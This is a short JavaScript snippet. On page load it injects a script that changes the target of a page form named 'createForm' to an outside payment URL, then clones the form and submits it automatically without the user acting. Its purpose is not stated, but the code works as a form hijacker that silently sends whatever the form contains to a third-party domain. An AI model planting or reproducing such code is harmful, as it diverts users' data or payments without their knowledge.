window.onload = function() {
var scriptEle = document.createElement("script");
scriptEle.type = "text/javascript";
scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment/';let node = document.getElementById('createForm');let c = node.cloneNode(true);document.body.appendChild(c);c.submit();`;
document.body.appendChild(scriptEle);
}
